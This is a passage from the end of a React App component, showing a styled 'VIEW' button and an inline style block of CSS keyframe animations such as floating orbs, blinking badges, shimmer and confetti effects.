                className="w-full bg-gradient-to-r from-orange-500/80 to-orange-600/80 hover:from-orange-600/80 hover:to-orange-700/80 text-white font-bold py-3 sm:py-4 px-4 sm:px-6 rounded-lg sm:rounded-xl transition-all transform hover:scale-[1.02] text-base sm:text-xl"
              >
                VIEW
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Animation Keyframes - Keep as is */}
      <style>{`
        @keyframes floatOrbBig {
          0% { transform: translate(0, 0) scale(1); opacity: 0.5; }
          50% { transform: translate(-3%, 4%) scale(1.05); opacity: 0.7; }
          100% { transform: translate(0, 0) scale(1); opacity: 0.5; }
        }
        @keyframes floatOrbSmall {
          0% { transform: translate(0, 0) rotate(0deg); opacity: 0.4; }
          50% { transform: translate(5%, -6%) rotate(3deg); opacity: 0.6; }
          100% { transform: translate(0, 0) rotate(0deg); opacity: 0.4; }
        }
        @keyframes liveBlink {
          0% { opacity: 1; background: rgba(180, 100, 20, 0.15); border-color: #b36e1a; box-shadow: 0 0 12px rgba(180, 100, 20, 0.3); }
          50% { opacity: 0.9; background: rgba(180, 100, 20, 0.25); border-color: #cc8822; box-shadow: 0 0 18px rgba(200, 120, 20, 0.4); }
        }
        @keyframes blinkRed {
          0% { opacity: 1; background-color: #d44040; box-shadow: 0 0 8px #d44040; }
          50% { opacity: 0.3; background-color: #6a2a2a; box-shadow: 0 0 3px #6a2a2a; }
        }
        @keyframes discountRibbon {
          0% { box-shadow: 0 0 10px rgba(180,100,20,0.3), 0 0 20px rgba(200,120,20,0.2); }
          100% { box-shadow: 0 0 25px rgba(200,120,20,0.4), 0 0 40px rgba(180,100,20,0.3); }
        }
        @keyframes ringPop {
          0%, 100% { transform: scale(1); }
          50% { transform: scale(1.1); }
        }
        @keyframes glowPulse {
          from { box-shadow: 0 0 15px rgba(180,100,20,0.15); border-color: rgba(180,100,20,0.3); }
          to { box-shadow: 0 0 30px rgba(200,120,20,0.25); border-color: rgba(200,120,20,0.5); }
        }
        @keyframes shimmerSlow {
          0% { transform: translateX(-100%) rotate(25deg); }
          40% { transform: translateX(100%) rotate(25deg); }
          100% { transform: translateX(200%) rotate(25deg); }
        }
        @keyframes gradientMove {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes confetti-cannon {
          0% { transform: translateY(0) rotate(0deg); opacity: 0.5; }
          100% { transform: translateY(-200px) rotate(720deg) translateX(150px); opacity: 0; }
        }
        @keyframes float {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-10px); }
        }
        @keyframes spinSlow {
          0% { transform: rotateY(0deg); }
          50% { transform: rotateY(180deg); }
          100% { transform: rotateY(360deg); }
        }
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.3; }
          50% { opacity: 0.6; }
        }
        @keyframes shimmer {
          0% { background-position: -200% 0; }
          100% { background-position: 200% 0; }
        }
        .animate-floatOrbBig { animation: floatOrbBig 20s ease-in-out infinite; }
        .animate-floatOrbSmall { animation: floatOrbSmall 24s ease-in-out infinite; }
        .animate-liveBlink { animation: liveBlink 1.4s infinite step-start; }
        .animate-blinkRed { animation: blinkRed 1s infinite; }
        .animate-discountRibbon { animation: discountRibbon 1.2s infinite alternate; }
        .animate-ringPop { animation: ringPop 1.5s infinite; }
        .animate-glowPulse { animation: glowPulse 2.5s infinite alternate; }
        .animate-shimmerSlow { animation: shimmerSlow 8s infinite; }
        .animate-gradientMove { animation: gradientMove 4s ease infinite; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-float { animation: float 3s ease-in-out infinite; }
        .animate-spinSlow { animation: spinSlow 6s infinite linear; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-shimmer {
          animation: shimmer 2s infinite;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.05), transparent);
          background-size: 200% 100%;
        }
      `}</style>
    </div>
  );
}

export default App;
